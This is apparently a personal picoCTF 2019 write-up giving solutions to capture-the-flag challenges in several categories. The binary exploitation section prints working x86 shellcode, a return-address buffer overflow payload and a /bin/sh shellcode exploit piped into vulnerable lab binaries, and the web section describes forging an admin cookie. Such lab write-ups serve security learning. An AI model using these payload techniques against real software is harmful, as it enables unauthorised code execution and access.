# picoCTF

I will update this as I work through all of the challenges. I highly recommend trying them on your own before reading my solutions.

## General Skills

#### 2 Warm
This type of problem is really easy to solve with python. Open python in your terminal and use ```bin()``` to convert the number to binary.

#### Let's Warm Up
This is another one that is really easy with python. When converting hexadecimal to ASCII my method of choice is to use ```chr()```

#### Warmed Up
Another easy python challenge to convert to decimal ```int('0x3D', 16)```

#### Bases
If you haven't noticed already, python is your friend. This one I solved using ```base64.b64decode(encoded_string)```

#### First Grep
Easy grep, solved using ```cat file | grep "pico"```

#### Resources
Read the source code.

#### strings it
The name gives it away, but use strings to find the flag for this one ```strings strings | grep "pico"```

#### what's a net cat?
This one is super simple. Use ```netcat 2019shell1.picoctf.com 12265``` to connect to the server and retrieve the flag.

#### Based
Netcat to the server then convert the provided data from binary, octal, and hexadecimal.

#### First Grep: Part 2
Use grep recursively to find the flag ```grep -r "picoCTF"```

#### plumbing
Solve this by piping grep after netcat ```nc 2019shell1.picoctf.com 63345 | grep "picoCTF"```

#### whats-the-difference
You're given 2 images with one being a corrupted version of the other. I used a python script to compare the 2 images and return the differences. ```python whats-the-difference.py```

#### where-is-the-file
This one was really easy. Make sure to always list files with ```ls -la``` so you can view hidden ones. Once you find the file use ```cat``` to get the flag.

#### flag_shop
This was a fun one to solve. If you look at ```store.c``` you'll see that ```account_balance = account_balance - total_cost``` when purchasing the first flag option, so we'll want to give that a negative number if possible to increase our balance. If you input a large number like 999999999 you'll see that it applies negatively, thus incresing our balance. We can then use that to buy the second flag in the system which reveals our flag text.

## Forensics

#### Glory of the Garden
I went straight to the basics on this one. Flags are often hidden at the end of the image, and since we know the flag format we can search for it with ```strings garden.jpg | grep "pico"```

#### unzip
Another easy one, just unzip.

#### What Lies Within
This was hard to solve because the first 2 tools I used came up empty. Probably user error. The flag is hidden in the least significant bit of each pixel so I ended up using ```zsteg```

#### shark on wire 1
This was another really fun one for me. The first thing I did was waste a ton of time reading through the packets in wireshark. After doing that for a bit I started trying different filters, eventually following the UDP stream with ```udp.stream eq 6```. When you read through the packets in the stream you'll see that byte 42 of each packet contains part of the flag. If you combine these together you'll get the flag.

## Cryptography

#### The Numbers
This is another one where knowing the flag format helps us out significantly. We can see ```{ }``` which is part of our flag format, and can also see that none of the numbers are greater than 26. This probably means it's a simple substitution cypher. To solve this I wrote a python script that takes the alphabet and the provided numbers to print out the flag. ```python3 the_numbers.py```

#### 13
This is a caesar cipher, so just decode like any other.

#### Easy 1
This is vigenere cipher which we can pretty much tell by the provided table. To solve this one I wrote a python script ```python3 easy1.py```

#### caesar
As the name implies this is another caesar cipher. The trick to this one is finding the correct ROT.

## Binary Exploitation

#### handy-shellcode
This wasn't too hard but I always have the most fun with these. There's no overflow required for this challenge, just basic shellcode really. The first thing I did was convert the path of the file to shellcode:

<code>
\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x68\x33\x33\x65\x62\x68\x35\x35\x64\x32\x68\x64\x31\x36\x37\x68\x32\x39\x31\x66\x68\x32\x64\x36\x34\x68\x61\x38\x31\x36\x68\x34\x65\x31\x32\x68\x66\x30\x62\x38\x68\x65\x5f\x36\x5f\x68\x6c\x63\x6f\x64\x68\x73\x68\x65\x6c\x68\x6e\x64\x79\x2d\x68\x73\x2f\x68\x61\x68\x62\x6c\x65\x6d\x68\x2f\x70\x72\x6f
</code><br/><br/>
 
Then I completed it by adding the instructions to read the file, and executing the shellcode:
  
<code>
echo -e '\x31\xc9\x51\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x68\x33\x33\x65\x62\x68\x35\x35\x64\x32\x68\x64\x31\x36\x37\x68\x32\x39\x31\x66\x68\x32\x64\x36\x34\x68\x61\x38\x31\x36\x68\x34\x65\x31\x32\x68\x66\x30\x62\x38\x68\x65\x5f\x36\x5f\x68\x6c\x63\x6f\x64\x68\x73\x68\x65\x6c\x68\x6e\x64\x79\x2d\x68\x73\x2f\x68\x61\x68\x62\x6c\x65\x6d\x68\x2f\x70\x72\x6f\x31\xc0\xb0\x05\x89\xe3\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xfe\xc2\xcd\x80\x50\x53\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xcd\x80\x5b\x58\x83\xf8\x01\x74\xe1\xb0\x06\xcd\x80\xb0\x01\xcd\x80' | ./vuln
</code>

#### practice-run-1
This one is too simple to need an explanation.

#### OverFlow 0
This one requires a basic overflow to retreive the flag. We can see that the buffer is 128 bytes, so we'll feed it more than that to crash the program and retreive the flag.

#### OverFlow 1
The first thing you want to do for this challenge is look over the source code in ```vuln.c```. There are a few things to note here. First of all we can see that the buffer size is 64 bytes. We can see that when we run the program it gives us the return memory address, and also that there is a ```flag()``` function that's never called. It looks like we'll have to use a buffer overflow to execute the ```flag()``` function and get our flag. Another thing to note is what is actually allowing this buffer overflow to happen. Since the program is using ```gets(buf)``` it doesn't actually care about the buffer, it just keeps reading until a new line which ultimately overflows it.

To get started we'll want to get some basic memory information. Since this one gives us the return address as part of the main ```vuln()``` function we can run the program and enter something less than 64 bytes to see normal behaviour. After doing this we can see that the normal address is ```0x8048705```. Now we'll look at the program to find the address of the flag function. To do this I opened the vuln program with ```gdb vuln``` and examined the ```flag()``` function with ```disas flag```. We can now see that this address is ```0x080485e6```. One last thing is that since this is Intel architecture we'll need to convert to little endian before running anything, ```\xe6\x85\x04\x08```.

It took a little bit of playing around to retrieve the flag, but I've provided my code below. One tip while doing this is to alternate the letters that you're using for your buffer. Since the program prints the return memory address after execution, you can use that to see where you're overwriting the memory. In my case I noticed 44 in the address which is ```D (0x44)```, so I knew to shorten my string by a few bytes.

<code>
cat <(echo -e '666666666666666666666666666666666666666666666666666666666666666AAAABBBBCCCCD\xe6\x85\x04\x08') - | ./vuln
</code>

#### slippery-shellcode
I'll add more info later but will add super basic methodology along with my code below.

I used python generate 256 bytes of data, then appended my shellcode using the pwn library ```asm(shellcraft.i386.linux.sh())```

After that I used the same method as OverFlow1 to execute my code.

<code>cat <(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80') - | ./vuln</code>


## Web Exploitation

#### Insp3ct0r
This one really doesn't need much info. Read all of the source code.

#### logon
If you view the session cookies for this web app you'll see there is a flag for admin that is currently set to false. If you edit the cookie and set this to true you'll be able to retrive the flag.

#### where are the robots
This is web exploitation 101. Always check the ```robots.txt``` file.

## Reverse Engineering

#### vault-door-training
Source code is your friend.

#### dont-use-client-side
This is a lot like the hackthebox signup page. If you have a very basic understanding of JavaScript you'll be able to decode the 'algorithm' for the password verification.

#### vault-door-1
This challenge involves reading the Java source code and reverse engineering the algorithm being used to validate the password.

#### vault-door-3
To solve this one you need to reverese engineer the Java code used for password validation. I created my Java code to mirror the validation function, then used ```node``` to execute line by line and get the flag. The code for this is in ```vault-door-3.java```.
